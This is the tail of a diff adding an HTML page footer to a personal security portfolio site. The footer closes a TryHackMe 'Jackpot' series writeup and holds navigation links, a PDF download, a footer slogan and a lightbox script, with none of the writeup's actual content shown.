+<p>Writeup generated from the exploitation sessions. All payloads, responses and flags are verbatim from the engagements. page 12</p>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/combined-jackpot-series-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="combined-jackpot-series-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
